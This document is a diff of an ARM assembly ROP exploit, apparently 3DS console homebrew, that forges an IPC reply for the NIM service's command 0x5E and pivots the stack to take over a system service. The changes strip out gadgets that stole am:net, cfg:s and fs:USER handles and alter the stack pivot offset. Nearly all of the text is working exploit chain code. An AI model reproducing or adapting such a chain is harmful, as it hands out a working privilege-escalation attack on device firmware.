@@ -5,13 +5,9 @@
 
 	.global NIMS_0x5E_IPC_PwnedReplyBase
 NIMS_0x5E_IPC_PwnedReplyBase:
-	.word IPC_MakeHeader(0x5e, 1, 4)
+	.word IPC_MakeHeader(0x5e, 2, 0)
 	.word 0 @ result
-	.word IPC_Desc_SharedHandles(3)
-	@ to be copied by the ROP
-	.word 0 @ am:net
-	.word 0 @ cfg:s
-	.word 0 @ fs:USER
+	.word 1 @ bool true
 .LNIMS_0x5E_IPC_PwnedReplyBase_end:
 	.size NIMS_0x5E_IPC_PwnedReplyBase, .-NIMS_0x5E_IPC_PwnedReplyBase
 
@@ -64,28 +60,6 @@ NIMS_0x5E_ROP_STAGE2_Part1:
 	.word ROP_GARBAGE @ r4
 	.word 3 @ stack arg 1
 	.word 3 @ stack arg 2
-	.word ROP_POPR1PC @ POP {R1, PC}
-	.word ROP_SAMPLEIPC_CMDBUF_INDEX(5) @ our ipc sample, fs:USER handle space
-	.word ROP_GETFSUSER_HANDLE_POPR4PC @ get fs:USER handle on r0 and keep chain with pop {r4, pc}
-	.word ROP_GARBAGE @ r4
-	.word ROP_STR_R0TOR1_POPR4PC @ STR R0, [R1]; POP {R4, PC}
-	.word ROP_AMNET_HANDLE_ADDR @ am:net handle addr
-	.word ROP_MOVR0R4_POPR4PC @ MOV r0, r4; pop {r4, pc}
-	.word ROP_GARBAGE @ r4
-	.word ROP_LDR_R0FROMR0_POPR4PC @ LDR r0, [r0]; POP {R4, PC}
-	.word ROP_GARBAGE @ r4
-	.word ROP_POPR1PC @ POP {R1, PC}
-	.word ROP_SAMPLEIPC_CMDBUF_INDEX(3) @ our ipc sample, am:net handle space
-	.word ROP_STR_R0TOR1_POPR4PC @ STR R0, [R1]; POP {R4, PC}
-	.word ROP_CFGS_HANDLE_ADDR @ cfg:s handle addr
-	.word ROP_MOVR0R4_POPR4PC @ MOV r0, r4; pop {r4, pc}
-	.word ROP_GARBAGE @ r4
-	.word ROP_LDR_R0FROMR0_POPR4PC @ LDR r0, [r0]; POP {R4, PC}
-	.word ROP_GARBAGE @ r4
-	.word ROP_POPR1PC @ POP {R1, PC}
-	.word ROP_SAMPLEIPC_CMDBUF_INDEX(4) @ our ipc sample, cfg:s handle space
-	.word ROP_STR_R0TOR1_POPR4PC @ STR R0, [R1]; POP {R4, PC}
-	.word ROP_GARBAGE @ r4
 	.word ROP_GETTLSADDR_ADD0X5C_POPR4PC @ thumb get tls pointer+0x5C to r0, pop {r4, pc}
 	.word ROP_GARBAGE @ r4
 	.word ROP_ADDR0_0X10_POPR4PC @ thumb add r0, #0x10 and pop {r4,pc}
@@ -153,7 +127,7 @@ NIMS_0x5E_ROP_STAGE2_Part2:
 	.word 0 @ r2
 	.word 0 @ r3
 	.word 0 @ r12
-	.word ROP_SERVICE_TAKEOVER_ADDR+0x1000 @ sp
+	.word ROP_SERVICE_TAKEOVER_ADDR+0x208 @ sp
 	.word 0 @ lr
 	.word ROP_POPPC @ pc
 .LNIMS_0x5E_ROP_STAGE2_Part2_end:
